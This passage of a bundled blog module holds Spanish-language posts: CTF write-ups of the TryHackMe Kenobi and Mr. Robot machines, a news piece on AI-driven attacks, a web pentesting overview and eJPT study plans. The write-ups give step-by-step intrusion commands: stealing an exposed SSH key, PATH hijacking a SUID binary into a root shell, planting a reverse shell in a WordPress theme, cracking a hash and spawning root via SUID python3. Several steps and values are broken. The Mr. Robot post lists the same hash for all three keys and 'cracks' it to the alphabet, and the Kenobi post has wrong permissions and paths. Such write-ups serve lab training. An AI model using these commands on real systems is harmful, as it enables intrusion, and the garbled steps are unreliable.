Requiere **aprendizaje constante**, **mentalidad analítica** y un compromiso ético sólido para garantizar que la tecnología sea más segura para todos.`,__vite_glob_0_20=`---\r
title: "Kenobi — TryHackMe"\r
description: "Writeup paso a paso de la máquina Kenobi de TryHackMe, desde el reconocimiento inicial hasta la escalada de privilegios."\r
date: "2026-05-24"\r
published: true\r
tags: ["tryhackme", "linux", "enumeracion", "smb", "nfs", "privilege-escalation", "pentesting"]\r
readTime: "18 min"\r
---\r
\r
# 🔥 TryHackMe — Kenobi\r
\r
La máquina **Kenobi** es una buena introducción a la enumeración de servicios Linux, SMB, NFS y escalada de privilegios a través de **path hijacking** y **SUID**. En este post te dejo un writeup ordenado y reproducible para que puedas seguir la ruta de explotación sin perderte.\r
\r
---\r
\r
## 1) Preparación del entorno\r
\r
Lo primero es agregar la IP de la máquina a nuestro \`/etc/hosts\` para tener un nombre amigable.\r
\r
\`\`\`bash\r
sudo nano /etc/hosts\r
\`\`\`\r
\r
Agrega una entrada similar a esta:\r
\r
\`\`\`bash\r
<IP_KENOBI>  kenobi.thm\r
\`\`\`\r
\r
Luego iniciamos el reconocimiento con un escaneo de puertos agresivo.\r
\r
\`\`\`bash\r
nmap -sCV -Pn -T5 --min-rate 9500 <IP>\r
\`\`\`\r
\r
Para esta máquina normalmente aparecen servicios como **SMB**, **FTP**, **NFS** y **SSH**.\r
\r
---\r
\r
## 2) Enumeración SMB\r
\r
Enumeramos los shares y usuarios de SMB.\r
\r
\`\`\`bash\r
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>\r
\`\`\`\r
\r
Probamos el acceso anónimo a SMB.\r
\r
\`\`\`bash\r
smbclient //<IP>/anonymous\r
\`\`\`\r
\r
Si el share acepta anónimo, podemos listar archivos o descargar información interesante.\r
\r
\`\`\`bash\r
wget log.txt\r
\`\`\`\r
\r
También podemos hacer una copia recursiva del share.\r
\r
\`\`\`bash\r
smbget -R smb://<IP>/anonymous\r
\`\`\`\r
\r
Esto suele revelar archivos de ayuda o información útil para la siguiente fase.\r
\r
---\r
\r
## 3) Enumeración NFS\r
\r
La máquina también expone NFS en el puerto 111. Podemos enumerar el exportado con scripts de Nmap.\r
\r
\`\`\`bash\r
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>\r
\`\`\`\r
\r
Después montamos el exportado \`/var\` para revisar si hay archivos sensibles.\r
\r
\`\`\`bash\r
mkdir /mnt/kenobiNFS\r
mount <IP>/var /mnt/kenobiNFS\r
ls -la /mnt/kenobiNFS\r
\`\`\`\r
\r
Si encontramos un directorio temporal con un \`id_rsa\`, lo podemos copiar.\r
\r
\`\`\`bash\r
cp /mnt/kenobiNFS/tmp/id_rsa ./id_rsa\r
chmod +x id_rsa\r
\`\`\`\r
\r
---\r
\r
## 4) Acceso por SSH\r
\r
Con la clave privada obtenida, intentamos autenticarnos como \`kenobi\`.\r
\r
\`\`\`bash\r
ssh -i id_rsa kenobi@<IP>\r
\`\`\`\r
\r
Una vez dentro, leemos la bandera de usuario.\r
\r
\`\`\`bash\r
cat /home/kenobi/user.txt\r
\`\`\`\r
\r
---\r
\r
## 5) Reconocimiento post-explotación\r
\r
Nos movemos al análisis del sistema en busca de binaries con permisos SUID.\r
\r
\`\`\`bash\r
find / -perm -u=s -type f 2>/dev/null\r
\`\`\`\r
\r
Esto suele mostrar herramientas que pueden ser abusadas para escalar privilegios.\r
\r
También comprobamos servicios y el kernel.\r
\r
\`\`\`bash\r
curl -I localhost\r
uname -r\r
ifconfig\r
\`\`\`\r
\r
> En el writeup original también se utiliza \`ifconfig\`, así que es recomendable usar esa herramienta si está instalada en la máquina.\r
\r
---\r
\r
## 6) Escalada de privilegios\r
\r
La explotación en Kenobi suele pasar por abusar del binary \`/usr/bin/menu\` o de la variable \`PATH\`.\r
\r
Primero verificamos qué ejecuta el binario. Si no hay una ruta segura, podemos preparar un payload malicioso en \`curl\`.\r
\r
\`\`\`bash\r
echo /bin/sh > curl\r
chmod +x curl\r
export PATH=/tmp:$PATH\r
/usr/bin/menu\r
\`\`\`\r
\r
Si el binario invoca \`curl\` sin ruta absoluta, el shell malicioso será ejecutado con privilegios de root.\r
\r
Una vez dentro del shell privilegiado, leemos la bandera final.\r
\r
\`\`\`bash\r
cat /root/root.txt\r
\`\`\`\r
\r
---\r
\r
## 7) Resumen de la ruta de ataque\r
\r
1. Escaneo inicial con \`nmap\`.\r
2. Enumeración SMB y acceso anónimo.\r
3. Descarga de información sensible y/o exploración recursiva de shares.\r
4. Enumeración NFS y montaje del exportado.\r
5. Obtención de \`id_rsa\` y acceso vía SSH.\r
6. Búsqueda de SUID y abuso de \`PATH\`/\`/usr/bin/menu\`.\r
7. Lectura de \`/root/root.txt\`.\r
\r
---\r
\r
## 8) Comandos clave usados\r
\r
\`\`\`bash\r
sudo nano /etc/hosts\r
nmap -sCV -Pn -T5 --min-rate 9500 <IP>\r
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>\r
smbclient //<IP>/anonymous\r
wget log.txt\r
smbget -R smb://<IP>/anonymous\r
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>\r
mkdir /mnt/kenobiNFS\r
mount <IP>/var /mnt/kenobiNFS\r
ls -la /mnt/kenobiNFS\r
cp /mnt/kenobiNFS/tmp/id_rsa ./id_rsa\r
chmod +x id_rsa\r
ssh -i id_rsa kenobi@<IP>\r
cat /home/kenobi/user.txt\r
find / -perm -u=s -type f 2>/dev/null\r
curl -I localhost\r
uname -r\r
ifconfig\r
echo /bin/sh > curl\r
chmod +x curl\r
export PATH=/tmp:$PATH\r
/usr/bin/menu\r
cat /root/root.txt\r
\`\`\`\r
\r
---\r
\r
## 9) Lecciones aprendidas\r
\r
- **SMB anónimo** puede revelar información útil incluso si no se tiene acceso completo.\r
- **NFS montado sin restricciones** puede exponer archivos sensibles como claves privadas.\r
- **SUID binaries** y **PATH hijacking** siguen siendo vectores clásicos de escalada de privilegios.\r
- Siempre conviene revisar el contenido de \`/tmp\`, \`/var/tmp\` y archivos auxiliares que puedan ser abusados por un usuario con permisos de ejecución.\r
\r
Si quieres, en el próximo post puedo hacer una versión **más técnica y detallada** de la escalada específica de \`menu\` o una **tabla de servicios y evidencias** por cada paso. \r
`,__vite_glob_0_21=`---\r
title: "Microsoft alerta sobre el crecimiento de ataques impulsados por IA"\r
date: "2026-07-05"\r
description: "Microsoft advierte de la escalada de campañas de phishing, malware y fraude automatizado impulsadas por inteligencia artificial y deepfakes."\r
tags: ["ciberseguridad", "ia", "microsoft", "phishing", "deepfakes", "noticias"]\r
readTime: "6 min"\r
published: true\r
---\r
\r
## 🚨 La nueva frontera del fraude digital\r
\r
Microsoft ha advertido que los ciberdelincuentes están acelerando sus operaciones mediante herramientas de inteligencia artificial. Lo que antes requería horas o incluso días de trabajo manual ahora puede realizarse en minutos, con un nivel de personalización mucho mayor y un impacto potencialmente más devastador.\r
\r
Este cambio no sólo afecta a grandes empresas, sino también a pymes, instituciones públicas y usuarios particulares. La amenaza ya no se limita a ataques tradicionales: ahora también se combina con técnicas de ingeniería social y contenido sintético para engañar a personas y sistemas.\r
\r
---\r
\r
## 🔍 Qué está cambiando realmente\r
\r
Según la compañía, la IA está siendo utilizada para:\r
\r
- Crear correos de phishing mucho más convincentes y personalizados.\r
- Automatizar la búsqueda de vulnerabilidades en sistemas y aplicaciones.\r
- Generar malware o variantes de código con mayor rapidez.\r
- Suplantar la identidad de empleados mediante voz, imágenes y video generados por IA.\r
\r
Este nuevo modelo reduce el tiempo de preparación del ataque y aumenta las probabilidades de éxito, especialmente cuando las defensas están basadas únicamente en reglas estáticas o detección tradicional.\r
\r
> La principal diferencia es que ya no solo se atacan sistemas: se atacan personas, contextos y emociones.\r
\r
---\r
\r
## 🧠 Por qué esto es especialmente peligroso\r
\r
La inteligencia artificial permite adaptar los ataques a cada víctima. Un correo de phishing ya no se limita a un texto genérico; puede incluir referencias a la empresa, al rol del destinatario o a hechos recientes que hagan que el mensaje parezca legítimo.\r
\r
Esto también afecta a los mecanismos de autenticación. Con deepfakes y contenido sintético, los atacantes pueden intentar engañar a sistemas que dependen de reconocimiento de voz o vídeo, o incluso manipular a personas que forman parte de procesos críticos como aprobaciones financieras o accesos sensibles.\r
\r
---\r
\r
## 🛡️ Recomendaciones para organizaciones\r
\r
Microsoft insiste en que la respuesta debe ser multidimensional. Algunas medidas clave son:\r
\r
- Implementar autenticación multifactor (MFA) en todos los servicios críticos.\r
- Capacitar periódicamente a los equipos sobre phishing, fraude y manipulación digital.\r
- Mantener sistemas, aplicaciones y bibliotecas actualizadas.\r
- Realizar copias de seguridad frecuentes y verificables.\r
- Adoptar soluciones de detección y respuesta como EDR/XDR.\r
- Supervisar continuamente la actividad de red y las anomalías de autenticación.\r
\r
Además, las empresas deben revisar sus procesos de validación, sobre todo cuando se trata de transferencias, cambios de contraseña o solicitudes de información sensible.\r
\r
---\r
\r
## 🔮 Tendencia para 2026: IA contra IA\r
\r
Uno de los mayores cambios de esta nueva etapa es la aparición de una carrera entre atacantes y defensores. Mientras los criminales usan IA para perfeccionar sus campañas, las organizaciones también recurren a la inteligencia artificial para detectar amenazas, priorizar alertas y responder de forma más rápida.\r
\r
En 2026, la ciberseguridad dejará de estar centrada únicamente en la protección de infraestructura y pasará a ser una disciplina de adaptación continua, con análisis automatizado, detección contextual y respuesta en tiempo real.\r
\r
La conclusión es clara: el futuro de la seguridad digital no dependerá solo de herramientas, sino también de la capacidad de las organizaciones para anticipar, entrenar y reaccionar ante un entorno donde la IA ya forma parte del ataque y de la defensa.\r
`,__vite_glob_0_22=`---\r
title: "Mr. Robots"\r
description: "Mr. Robots CTF es una interesante sala de TryHackMe con elementos de juego en la que aprenderás a explotar una vulnerabilidad de inyección SQL, descifrar un hash para obtener un acceso inicial, pivotar dentro del sistema y escalar privilegios hasta root."\r
date: "2025-12-07"\r
published: true\r
tags: ["tryhackme", "pentesting", "writeup", "pivoting"]\r
readTime: "20 min"\r
---\r
\r
# Mr. Robot CTF — Writeup TryHackMe\r
\r
## 📖 Introducción\r
La sala **Mr. Robot CTF** de TryHackMe mezcla hacking con referencias a la serie, y su objetivo es obtener tres llaves escondidas dentro del sistema. Para ello se deben explotar vulnerabilidades web, obtener acceso inicial, pivotar dentro del entorno y finalmente escalar privilegios hasta root.\r
\r
---\r
\r
## ⚙️ Configuración Inicial\r
En primer lugar, agregamos la IP de la máquina al archivo \`/etc/hosts\`:\r
\r
\`\`\`bash\r
echo "10.201.56.233 Mr-Robot-CTF.tryhackme.com" >> /etc/hosts\r
ping Mr-Robot-CTF.tryhackme.com\r
\`\`\`\r
\r
## 🔎 Escaneo Inicial con Nmap\r
\r
Realizamos un escaneo de puertos y servicios:\r
\r
\`\`\`bash\r
nmap -sVC -T5 --min-rate 15000 10.201.56.233\r
\`\`\`\r
\r
Puertos encontrados:\r
\r
22/tcp → SSH\r
\r
80/tcp → HTTP (Apache)\r
\r
443/tcp → HTTPS (Apache)\r
\r
## 📂 Enumeración Web\r
\r
Realizamos descubrimiento de directorios con Gobuster:\r
\r
\`\`\`bash\r
gobuster dir -u http://10.201.56.233/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64\r
\`\`\`\r
\r
Archivos importantes:\r
\r
/robots.txt → contiene fsocity.dic y key-1-of-3.txt\r
\r
/key-1-of-3.txt\r
\r
/fsocity.dic\r
\r
/license → contiene un Base64\r
\r
## 📌 Revisión manual:\r
\r
1. Robots.txt\r
Contiene:\r
\r
fsocity.dic\r
\r
key-1-of-3.txt\r
\r
2. Primera llave:\r
\r
**073403c8a58a1f80d943455fb30724b9**\r
\r
3. fsocity.dic\r
Descargado con:\r
\r
\`\`\`bash\r
curl -o fsocity.dic http://10.201.56.233/fsocity.dic\r
\`\`\`\r
\r
4. license (Base64 encontrado):\r
\r
**ZWxsaW90OkVSMjgtMDY1Mgo=**\r
\r
Decodificado en CyberChef →\r
Credenciales: elliot : ER28-0652\r
\r
\`\`\`bash\r
http://Mr-Robot-CTF.tryhackme.com/wp-login.php\r
\`\`\`\r
\r
* Ingresamos con las credenciales obtenidas.\r
\r
Dentro del panel, WordPress permite editar archivos. Sustituimos el contenido de una plantilla por una reverse shell generada en revshells.com.\r
\r
## 🖥️ Crear Reverse Shell\r
\r
Configuramos un listener:\r
\r
\`\`\`bash\r
nc -nvlp 443\r
\`\`\`\r
\r
Ejecutamos la shell visitando:\r
\r
\`\`\`bash\r
http://Mr-Robot-CTF.tryhackme.com/wp-content/themes/twentyseventeen/404.php\r
\`\`\`\r
\r
Mejoramos la TTY:\r
\r
\`\`\`bash\r
python3 -c 'import pty; pty.spawn("/bin/bash")'\r
\`\`\`\r
\r
## 🔑 Segunda llave\r
\r
El archivo key-2-of-3.txt no se podía leer directamente.\r
Creamos un archivo secret con su hash:\r
\r
\`\`\`bash\r
echo "073403c8a58a1f80d943455fb30724b9" > secret\r
\`\`\`\r
\r
Lo crackeamos con John:\r
\r
\`\`\`bash\r
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt secret\r
\`\`\`\r
\r
Resultado: **abcdefghijklmnopqrstuvwxyz**\r
\r
Accedemos como robot:\r
\r
\`\`\`bash\r
su robot\r
\r
cat /home/robot/key-2-of-3.txt\r
\`\`\`\r
\r
Segunda llave:\r
\r
**073403c8a58a1f80d943455fb30724b9**\r
\r
👑 Escalada de Privilegios\r
\r
Buscamos binarios con SUID:\r
\r
\`\`\`bash\r
find / -perm -4000 2>/dev/null\r
\`\`\`\r
\r
Encontramos:\r
\r
\`\`\`bash\r
/usr/bin/python3\r
\`\`\`\r
\r
Utilizamos Python para escalar privilegios:\r
\r
\`\`\`bash\r
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'\r
\`\`\`\r
\r
Accedemos como root:\r
\r
\`\`\`bash\r
cat /root/key-3-of-3.txt\r
\`\`\`\r
\r
Tercera llave:\r
\r
**073403c8a58a1f80d943455fb30724b9**\r
`,__vite_glob_0_23=`---\r
title: "Pentesting de Aplicaciones Web"\r
description: "El pentesting de aplicaciones web es una disciplina especializada que busca identificar y explotar vulnerabilidades en aplicaciones que operan a través de navegadores web, ayudando a fortalecer la seguridad de la información."\r
date: "2025-11-03"\r
published: true\r
tags: ["pentesting", "web", "seguridad", "OWASP", "ethical hacking"]\r
readTime: "10 min"\r
---\r
\r
## Introducción\r
\r
El **pentesting de aplicaciones web** es una práctica crítica dentro de la ciberseguridad moderna. Su objetivo es **identificar vulnerabilidades antes de que los atacantes puedan explotarlas**, evaluando desde la infraestructura subyacente hasta la lógica de negocio de la aplicación.\r
\r
Se basa en metodologías estructuradas, herramientas especializadas y pruebas tanto **manuales** como **automatizadas** para asegurar una cobertura completa de seguridad.\r
\r
---\r
\r
## 🧩 Metodología OWASP\r
\r
### 🔍 Reconocimiento\r
- **Fingerprinting**: Identificación de tecnologías, frameworks y versiones.  \r
- **Mapeo de la aplicación**: Descubrimiento de rutas, funcionalidades y endpoints.  \r
- **Análisis de superficie de ataque**: Localización de posibles puntos de entrada vulnerables.\r
\r
### 📋 Enumeración\r
- **Directorios y archivos ocultos**: Exploración de recursos no expuestos públicamente.  \r
- **Parámetros de usuario**: Identificación de inputs y validaciones existentes.  \r
- **Tecnologías**: Determinación de versiones de frameworks, librerías y dependencias.\r
\r
---\r
\r
## ⚠️ Vulnerabilidades Comunes (OWASP Top 10)\r
\r
### 1. Injection\r
- **SQL Injection**: Manipulación de consultas de base de datos.  \r
- **NoSQL Injection**: Ataques dirigidos a bases de datos NoSQL.  \r
- **Command Injection**: Ejecución de comandos del sistema desde inputs vulnerables.\r
\r
### 2. Broken Authentication\r
- **Credenciales débiles**: Contraseñas predecibles o reutilizadas.  \r
- **Gestión de sesiones inadecuada**: Tokens expuestos o mal configurados.  \r
- **Brute force**: Intentos automáticos de acceso mediante fuerza bruta.\r
\r
### 3. Sensitive Data Exposure\r
- **Datos en tránsito**: Comunicaciones no cifradas (HTTP en lugar de HTTPS).  \r
- **Datos en reposo**: Almacenamiento inseguro de información sensible.  \r
- **Registros inseguros**: Logs que exponen información crítica.\r
\r
---\r
\r
## 🛠️ Herramientas Esenciales de Pentesting Web\r
\r
### 🔗 Proxies Interceptores\r
- **Burp Suite**: Suite completa para testing y manipulación de solicitudes.  \r
- **OWASP ZAP**: Alternativa gratuita y open source para auditorías web.  \r
- **Caido**: Proxy moderno, rápido y eficiente para pruebas de seguridad.\r
\r
### 🤖 Escáneres Automatizados\r
- **Nikto**: Escaneo de vulnerabilidades web conocidas.  \r
- **Dirb / Dirbuster**: Enumeración de directorios y archivos ocultos.  \r
- **SQLMap**: Automatización de ataques de SQL Injection.\r
\r
### 🕵️ Herramientas de Reconocimiento\r
- **Nmap**: Escaneo de puertos y servicios asociados a la aplicación.  \r
- **WhatWeb**: Identificación de tecnologías web y plugins.  \r
- **Sublist3r**: Enumeración de subdominios activos.\r
\r
---\r
\r
## 🔧 Técnicas de Testing\r
\r
### Manual Testing\r
1. **Análisis de código fuente**: Revisión de JavaScript, HTML y APIs internas.  \r
2. **Manipulación de parámetros**: Modificación de inputs y pruebas de validación.  \r
3. **Bypass de controles**: Evasión de validaciones client-side y filtros.  \r
4. **Session Testing**: Evaluación del manejo de sesiones y cookies.\r
\r
### Automated Testing\r
1. **Vulnerability Scanning**: Escaneo automatizado de fallos conocidos.  \r
2. **Fuzzing**: Envío de datos malformados para descubrir errores de parsing.  \r
3. **Crawling**: Mapeo automático de rutas y endpoints de la aplicación.\r
\r
---\r
\r
## 📂 Casos de Estudio\r
\r
### E-commerce Application\r
- Pruebas en el carrito de compras y formularios de pago.  \r
- Manipulación de precios y bypass de autenticación.  \r
- Inyección de datos y explotación de formularios vulnerables.\r
\r
### API Testing\r
- Enumeración de endpoints y revisión de métodos HTTP.  \r
- Evaluación de autenticación JWT y tokens de sesión.  \r
- Bypass de limitaciones de rate-limiting y *parameter pollution*.\r
\r
---\r
\r
## 📑 Reporting y Remediación\r
\r
### Estructura Recomendada de Reporte\r
1. **Executive Summary**: Resumen ejecutivo para la dirección.  \r
2. **Technical Findings**: Hallazgos técnicos detallados con evidencias.  \r
3. **Risk Assessment**: Evaluación de riesgos y criticidad.  \r
4. **Recommendations**: Medidas concretas de remediación y mitigación.\r
\r
### Clasificación de Vulnerabilidades\r
- **Critical**: Acceso completo al sistema o datos sensibles.  \r
- **High**: Compromiso significativo, riesgo alto de explotación.  \r
- **Medium**: Exposición de información o debilidades moderadas.  \r
- **Low**: Problemas menores de configuración o seguridad.\r
\r
---\r
\r
## Conclusión\r
\r
El **pentesting de aplicaciones web** es un proceso sistemático que combina **conocimientos técnicos avanzados, metodologías estructuradas y herramientas especializadas**.  \r
Realizar pruebas tanto manuales como automatizadas permite a los profesionales de ciberseguridad **identificar y mitigar vulnerabilidades críticas** antes de que puedan ser explotadas, protegiendo tanto la infraestructura como la información sensible de usuarios y organizaciones.\r
\r
> La clave del pentesting exitoso es la combinación de **precisión técnica, ética profesional y documentación detallada**.`,__vite_glob_0_24=`---\r
title: "plan-tryhackme-free-ejpt"\r
description: "Plan estructurado de entrenamiento para el eJPT con ejercicios reales, máquinas recomendadas y una ruta de estudio totalmente basada en práctica."\r
date: "2025-12-12"\r
published: true\r
tags: ["ejpt", "pentesting", "certificaciones", "tryhackme", "ethical hacking"]\r
readTime: "15 min"\r
---\r
\r
# 🟩 Entrenamiento para Aprobar el eJPT\r
\r
Este plan está diseñado para fortalecer los puntos débiles más comunes del examen eJPT, especialmente en áreas como enumeración, auditoría de red, pivoting y explotación de servicios, nos apoyaremos de la plataforma **tryhackme** para realizar los ejercicios y mejorar nuestras habilidades.\r
\r
---\r
\r
## 🔵 Semana 1 — Fundamentos de Enumeración y Escaneo\r
\r
### Objetivo:\r
Corregir fallos críticos en reconocimiento y auditoría de red.\r
\r
### 1. **Intro to Networking** \r
- Comprensión de subredes, rangos y DMZ.  \r
- *Área donde presentaste fallos en el examen.*\r
\r
### 2. **Nmap — Live Host Discovery**\r
- Identificación de endpoints.  \r
- Detección de puertos y servicios.  \r
- *Fallaste reconocimiento básico, así que esta room es clave.*\r
\r
### 3. **Nmap (Advanced)**\r
- Escaneo profundo.  \r
- Detección de versión y sistema operativo.  \r
- Uso de scripts NSE.\r
\r
### 4. **Network Services 1 (FTP, SMB, SSH)**\r
- Enumeración de SMB (usuarios y recursos).  \r
- FTP con acceso anónimo.  \r
- Temas frecuentes en el eJPT.\r
\r
### 5. **Network Services 2 (MySQL, RDP, etc.)**\r
- Enumeración de MySQL (muy recurrente en el examen).  \r
- Recolección de credenciales y configuraciones.\r
\r
---\r
\r
## 🔵 Semana 2 — Pivoting + Explotación en Host\r
\r
### 1. **Pivoting Fundamentals (Free)**\r
- Conceptos de routing y autoroute.  \r
- Dynamic port forwarding (SSH / Metasploit).  \r
- *Tema donde tuviste un fallo crítico durante el examen.*\r
\r
### 2. **Metasploit Intro & Metasploit Pivoting**\r
- Uso de módulos como \`hta_server\`.  \r
- Creación de rutas y túneles SOCKS.  \r
- Enumeración de redes internas.\r
\r
### 3. **Linux Fundamentals 1–3**\r
- Enumeración del sistema.  \r
- Permisos, usuarios y archivos clave.  \r
- Localización de credenciales en CMS.\r
\r
### 4. **Windows Fundamentals 1–2**\r
- Enumeración de usuarios y grupos locales.  \r
- Cuentas Administrator y política de contraseñas.  \r
- *Otro punto débil detectado en tu examen.*\r
\r
---\r
\r
## 🔵 Semana 3 — Web + CMS (Drupal / WordPress)\r
\r
### 1. **OWASP Top 10 (Free)**\r
- Enumeración web y análisis de superficie.  \r
- WebDAV (pregunta real del eJPT).  \r
- LFI/RFI y brute force en logins.\r
\r
### 2. **Attacktive Directory (Free)**\r
- Enumeración SMB/LDAP.  \r
- Ataques de fuerza bruta.  \r
- Usuarios, grupos y estructura AD.  \r
- *Muy similar a la parte DMZ del examen.*\r
\r
### 3. **WordPress CMS (Free)**\r
- Detección de versión.  \r
- Enumeración de plugins y themes.  \r
- Acceso a \`wp-config.php\`.  \r
- *Varias preguntas del examen provienen de WordPress.*\r
\r
### 4. **Drupal CMS (Práctica manual)**\r
No hay lab dedicado en Free, pero puedes ensayar:\r
- Revisión de \`changelog.txt\`.  \r
- Enumeración de usuarios.  \r
- Detección de versión con **droopescan**.\r
\r
---\r
\r
# 🔥 Labs TryHackMe Similares al eJPT (Todos Free)\r
\r
### 1. **Blue**\r
- SMB + explotación Windows.  \r
- Estilo de preguntas del examen.\r
\r
### 2. **Simple CTF**\r
- WordPress + archivos de configuración.  \r
- Privesc básica.\r
\r
### 3. **Mr. Robot**\r
- Enumeración web avanzada.  \r
- Fuerza bruta.  \r
- WordPress.  \r
- *Excelente simulación del eJPT.*\r
\r
### 4. **Kenobi**\r
- Enumeración SMB y NFS.  \r
- Usuarios y hashes.  \r
- *Directamente relacionado con tus fallos del examen.*\r
\r
### 5. **Steel Mountain**\r
- Explotación Windows.  \r
- Transferencia de archivos (certutil).  \r
- Privesc sencilla.\r
\r
---\r
\r
# 🟢 Plan Final Día por Día (15 Días)\r
\r
## Semana 1 — Enumeración Hardcore (Día 1–7)\r
- **D1:** Host discovery + service discovery con Nmap  \r
- **D2:** NSE + detección de SO  \r
- **D3:** SMB enumeration (Kenobi)  \r
- **D4:** Fuerza bruta FTP/SSH  \r
- **D5:** Enumeración de MySQL  \r
- **D6:** Blue  \r
- **D7:** Repaso y creación de mindmap\r
\r
## Semana 2 — Pivoting + Host Exploitation (Día 8–14)\r
- **D8:** Pivoting Fundamentals  \r
- **D9:** Pivoting con Metasploit + autoroute  \r
- **D10:** Linux privilege escalation  \r
- **D11:** Windows privilege escalation  \r
- **D12:** Steel Mountain  \r
- **D13:** Simple CTF  \r
- **D14:** Drills de pivoting + SOCKS + Nmap interno\r
\r
## Semana 3 — Simulación Final (Día 15)\r
- Mr. Robot  \r
- Kenobi  \r
- Crea tu propio mini-examen  \r
- **Objetivo:** obtener **>80%** antes de presentar el examen real\r
\r
---\r
\r
\r
`,__vite_glob_0_25=`---\r
title: "Ruta de Preparación Profesional para eJPT"\r
description: "Guía estratégica y estructurada para dominar el examen eJPT utilizando laboratorios gratuitos de TryHackMe. Cubre desde enumeración básica hasta pivoting y explotación avanzada."\r
date: "2026-01-08"\r
published: true\r
tags: ["ejpt", "certificaciones", "pentesting", "tryhackme", "roadmap"]\r
readTime: "15 min"\r
---\r
\r
# 🛡️ Dominando el eJPT: Ruta de Estudio Profesional\r
\r
El examen **eJPT (eLearnSecurity Junior Penetration Tester)** es una certificación 100% práctica que evalúa tus habilidades reales en un entorno dinámico de caja negra. A diferencia de los exámenes teóricos, aquí debes enumerar, explotar y pivotar a través de una red corporativa simulada.\r
\r
Eh diseñado esta ruta de preparación utilizando laboratorios **gratuitos** de TryHackMe, seleccionados quirúrgicamente para cubrir los vectores de ataque más frecuentes en el examen real. Sigue este plan para maximizar tus posibilidades de éxito.\r
\r
---\r
\r
## 🟢 Fase 1: Reconocimiento y Enumeración\r
*La base de todo ataque exitoso. Si fallas aquí, fallarás en la explotación.*\r
\r
### 1. Network Services\r
**📌 Nivel:** Free | **🎯 Enfoque:** Protocolos básicos\r
\r
Esta sala es fundamental para entender cómo interactuar con servicios comunes sin herramientas automatizadas complejas.\r
- **Herramientas clave:** \`nmap\` \`-sn\`, \`-sV\`, \`-O\`, clientes SMB, FTP y HTTP.\r
- **Objetivos de aprendizaje:**\r
  - Detección de sistemas operativos (Windows vs Linux).\r
  - Enumeración de puertos abiertos y versiones de servicios.\r
\r
### 2. Network Services 2\r
**📌 Nivel:** Free | **🎯 Enfoque:** Enumeración profunda\r
\r
Profundiza en la configuración insegura de servicios de red, un escenario clásico en el eJPT.\r
- **Técnicas clave:**\r
  - **SMB Enumeration:** Listado de recursos compartidos (\`shares\`) y usuarios.\r
  - **FTP Anónimo:** Verificación de acceso \`ftp-anon\` y exfiltración de archivos.\r
\r
---\r
\r
## 🟢 Fase 2: Entorno Windows y SMB\r
*El examen eJPT tiene una fuerte carga de entornos Windows. Dominar SMB es obligatorio.*\r
\r
### 3. Blue\r
**📌 Nivel:** Free | **🎯 Enfoque:** Explotación de vulnerabilidades críticas\r
\r
El escenario perfecto para practicar la identificación y explotación de fallos históricos como EternalBlue.\r
- **Técnicas clave:**\r
  - Enumeración exhaustiva de Windows.\r
  - Detección y explotación de **MS17-010 (EternalBlue)**.\r
  - Manejo básico de sesiones **Meterpreter**.\r
\r
### 4. Steel Mountain\r
**📌 Nivel:** Free | **🎯 Enfoque:** Servidores Windows y Escalada\r
\r
Simula un entorno corporativo con Windows Server, combinando vulnerabilidades web con escalada de privilegios.\r
- **Técnicas clave:**\r
  - Enumeración de servicios HTTP en puertos no estándar.\r
  - Escalada de privilegios en Windows (PowerShell scripts, servicios vulnerables).\r
\r
---\r
\r
## 🟢 Fase 3: Hacking Web y CMS\r
*WordPress y Drupal son los CMS más recurrentes en el examen. Debes saber auditarlos manualmente y con herramientas.*\r
\r
### 5. WordPress: Basics & Blog\r
**📌 Nivel:** Free | **🎯 Enfoque:** Enumeración y Fuerza Bruta\r
\r
Dos salas esenciales para dominar el ataque al CMS más popular del mundo.\r
- **Técnicas clave:**\r
  - Uso de **WPScan** para enumerar usuarios, plugins y temas.\r
  - Ataques de fuerza bruta a paneles de login.\r
  - Extracción de credenciales de archivos de configuración (\`wp-config.php\`).\r
\r
### 6. DVWA (Damn Vulnerable Web App)\r
**📌 Nivel:** Free | **🎯 Enfoque:** Vulnerabilidades Web Clásicas\r
\r
Un entorno controlado para entender la lógica detrás de los fallos web.\r
- **Técnicas clave:**\r
  - **Command Injection:** Ejecución de comandos del sistema a través de inputs web.\r
  - Descubrimiento de archivos y credenciales en texto claro.\r
\r
### 7. Vulnversity\r
**📌 Nivel:** Free | **🎯 Enfoque:** Fuzzing y Uploads\r
\r
Práctica intensiva de reconocimiento web y explotación de subidas de archivos.\r
- **Técnicas clave:**\r
  - Fuzzing de directorios con \`dirb\` o \`gobuster\`.\r
  - Bypass de restricciones de subida de archivos.\r
  - Escalada de privilegios en Linux (SUID, GTFOBins).\r
\r
---\r
\r
## 🟢 Fase 4: Drupal (Punto Crítico)\r
*Drupal suele ser el "filtro" en el examen. Muchos estudiantes fallan aquí por falta de práctica específica.*\r
\r
### 8. Overpass & Internal\r
**📌 Nivel:** Free | **🎯 Enfoque:** CMS complejo y Pivoting\r
- **Técnicas clave:**\r
  - Enumeración de versiones de Drupal y explotación (Drupalgeddon, etc.).\r
  - Obtención de credenciales y acceso inicial.\r
  - **Pivoting:** Conceptos de túneles hacia redes internas.\r
\r
---\r
\r
## 🟢 Fase 5: Servicios e Infraestructura\r
### 9. Kenobi\r
**📌 Nivel:** Free | **🎯 Enfoque:** Samba, NFS y ProFTPD\r
\r
Una máquina "todo en uno" que combina múltiples vectores de entrada.\r
- **Técnicas clave:**\r
  - Explotación de FTP anónimo y montajes NFS.\r
  - Enumeración de MySQL.\r
  - Manipulación de binarios con SUID para escalada.\r
\r
---\r
\r
## 🟢 Fase 6: Pivoting y Redes Internas\r
*El diferencial del eJPT. Debes saber moverte de una máquina comprometida a otra inaccesible.*\r
\r
### 10. Wreath & Internal\r
**📌 Nivel:** Free | **🎯 Enfoque:** Movimiento Lateral\r
- **Técnicas clave:**\r
  - Configuración de \`autoroute\` y \`portfwd\` en Metasploit.\r
  - Escaneo de hosts en redes ocultas/internas.\r
  - Uso de Chisel o SSH tunneling (opcional pero recomendado).\r
\r
---\r
\r
## 🧠 Resumen Estratégico\r
\r
### Mapeo Rápido de Temas\r
Utiliza esta tabla para reforzar áreas específicas donde te sientas débil antes del examen.\r
\r
| Tema Clave | Room Recomendada (Free) |\r
| :--- | :--- |\r
